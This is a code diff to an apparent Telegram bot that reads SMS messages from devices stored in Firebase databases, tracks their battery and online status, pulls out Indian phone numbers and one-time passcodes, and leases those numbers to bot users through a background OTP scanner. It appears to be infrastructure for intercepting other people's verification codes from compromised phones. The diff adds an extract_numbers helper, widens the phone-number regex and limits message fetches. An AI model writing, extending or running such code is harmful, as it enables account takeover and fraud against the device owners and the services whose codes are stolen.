@@ -27,8 +27,8 @@ def load_data():
         default_data = {
             "owner_id": OWNER_ID,
             "admins": [],
-            "firebases": [], 
-            "users": {},     
+            "firebases": [], # {"url": "...", "auth": "...", "label": "..."}
+            "users": {},
             "free_mode": True,
             "user_leases": {}, 
             "user_history": {},
@@ -88,6 +88,15 @@ def decode_panel_url(panel_url):
         pass
     return None
 
+def extract_numbers(msgs):
+    nums = set()
+    pattern = re.compile(r'(?:\+?91|0)?([6-9]\d{9})')
+    for m in msgs:
+        text = m.get("message", "")
+        for match in pattern.findall(text):
+            nums.add(match)
+    return list(nums)
+
 def extract_otp(text):
     if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]):
         return None
@@ -121,7 +130,6 @@ class AdminStates(StatesGroup):
 async def get_owner_stats():
     data = load_data()
     fbs = data.get("firebases", [])
-    
     total_devices = 0
     online_devices = 0
     fb_stats = {}
@@ -142,10 +150,8 @@ async def get_owner_stats():
         fb_stats[label]["online"] += fb_online
 
     return {
-        "total_fbs": len(fbs),
-        "total_devices": total_devices,
-        "online_devices": online_devices,
-        "total_users": len(data.get("users", {})),
+        "total_fbs": len(fbs), "total_devices": total_devices,
+        "online_devices": online_devices, "total_users": len(data.get("users", {})),
         "total_otps": data.get("stats", {}).get("total_otps", 0),
         "fb_stats": fb_stats
     }
@@ -174,18 +180,16 @@ async def get_numbers_for_country(country_label, uid):
     battery = dev_data.get("battery", "?")
     
     # Fetch messages to find real numbers
-    numbers = set()
-    msgs = await fetch_fb(f"{selected_fb['url']}/messages/{selected_dev_id}.json", selected_fb.get("auth"))
+    url = f"{selected_fb['url']}/messages/{selected_dev_id}.json?orderBy=%22%24key%22&limitToLast=50"
+    msgs_dict = await fetch_fb(url, selected_fb.get("auth"))
     
-    if msgs:
-        for k, v in msgs.items():
+    msgs = []
+    if msgs_dict:
+        for k, v in msgs_dict.items():
             if isinstance(v, dict) and v.get("type") == "incoming":
-                body = v.get("message", "")
-                found_nums = re.findall(r'\b[6-9]\d{9}\b', body)
-                for n in found_nums:
-                    if len(n) == 10:
-                        numbers.add(n)
-                                
+                msgs.append(v)
+    
+    numbers = extract_numbers(msgs)
     user_hist = data.get("user_history", {}).get(str(uid), {})
     available = [n for n in numbers if n not in user_hist]
     random.shuffle(available)
@@ -243,7 +247,7 @@ async def background_global_scanner(main_bot: Bot):
                             text_content = msg.get("message", "")
                             otp = extract_otp(text_content)
                             if otp:
-                                found_nums = re.findall(r'\b[6-9]\d{9}\b', text_content)
+                                found_nums = re.findall(r'(?:\+?91|0)?([6-9]\d{9})', text_content)
                                 target_numbers = [re.sub(r'\D', '', n)[-10:] for n in found_nums]
                                 
                                 for num, users in number_to_users.items():
